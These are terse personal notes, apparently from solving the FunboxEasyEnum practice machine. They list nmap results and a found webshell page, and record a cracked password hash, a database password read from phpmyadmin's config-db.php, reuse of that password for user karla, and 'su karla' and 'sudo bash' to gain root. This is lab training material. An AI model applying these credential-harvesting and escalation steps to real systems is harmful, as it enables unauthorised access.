----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# FunboxEasyEnum
# 11/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

http://192.168.158.132/mini.php
http://192.168.158.132/phpmyadmin/index.php
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
hiphop           (oracle)     
cd /etc/phpmyadmin
cat config-db.php
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';

Password is reused for user karla!
karla:tgbzhnujm!
su karla
sudo bash